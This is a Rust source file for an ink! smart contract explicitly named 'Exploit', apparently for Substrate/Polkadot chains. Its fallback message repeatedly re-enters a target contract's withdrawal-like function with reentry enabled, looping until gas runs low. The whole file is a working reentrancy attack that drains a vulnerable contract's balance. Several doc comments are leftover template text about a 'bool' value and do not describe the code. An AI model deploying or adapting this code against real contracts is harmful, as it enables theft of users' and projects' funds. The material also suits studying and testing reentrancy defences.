#![cfg_attr(not(feature = "std"), no_std)]

#[ink::contract]
mod exploit {
    use ink::env::call::{build_call, Selector};

    /// Defines the storage of your contract.
    /// Add new fields to the below struct in order
    /// to add new static storage fields to your contract.
    #[ink(storage)]
    pub struct Exploit {
        /// Stores a single `bool` value on the storage.
        owner: AccountId,
        contract: AccountId,
        amount: Balance,
        gas_to_stop: u64
    }

    impl Exploit {
        /// Constructor that initializes the `bool` value to the given `init_value`.
        #[ink(constructor)]
        pub fn new(owner: AccountId, contract: AccountId, amount: Balance, gas_to_stop: u64) -> Self {
            Self {
                owner: owner,
                contract: contract,
                amount: amount,
                gas_to_stop: gas_to_stop
            }
        }
        
        #[ink(message)]
        pub fn set_gas_to_stop(&mut self, gas_to_stop: u64) {
            self.gas_to_stop = gas_to_stop;
        }

        #[ink(message)]
        pub fn get_balance(&mut self) -> Balance {
            self.env().balance()
        }

        #[ink(message, payable)]
        pub fn deposit(&mut self) -> Balance {
            let call = build_call::<ink::env::DefaultEnvironment>()
                .call(self.contract)
                .transferred_value(self.env().transferred_value())
                .exec_input(
                    ink::env::call::ExecutionInput::new(
                        Selector::new([0x2D_u8,0x10_u8,0xC9_u8,0xBD_u8])
                    ).into()
                ).returns::<Balance>().params();
            self.env().invoke_contract(&call)
                .unwrap_or_else(|err| panic!("Err {:?}",err))
                .unwrap_or_else(|err| panic!("LangErr {:?}",err))
        }

        /// A message that can be called on instantiated contracts.
        /// This one flips the value of the stored `bool` from `true`
        /// to `false` and vice versa.
        #[ink(message, payable, selector = 0x0)]
        pub fn exploit(&mut self) {
            ink::env::debug_println!("Exploit  function called from {:?} gas left {:?}",self.env().caller(), self.env().gas_left());
            if self.env().gas_left() > self.gas_to_stop{
                let call = build_call::<ink::env::DefaultEnvironment>()
                .call(self.contract)
                .transferred_value(0)
                .exec_input(
                    ink::env::call::ExecutionInput::new(Selector::new([0x76_u8,0x75_u8,0x7E_u8,0xD3_u8]))
                        .push_arg(self.env().account_id())
                        .push_arg(self.amount)
                        .push_arg(0)
                )
                .call_flags(
                    ink::env::CallFlags::default()
                        .set_allow_reentry(true)
                )
                .returns::<Balance>()
                .params();
                ink::env::debug_println!("Call generated gas left:{:?}",self.env().gas_left());
                self.env().invoke_contract(&call)
                    .unwrap_or_else(|err| panic!("Err {:?}",err))
                    .unwrap_or_else(|err| panic!("LangErr {:?}",err));
                ink::env::debug_println!("Call finished");
            } 
        }
    }

}
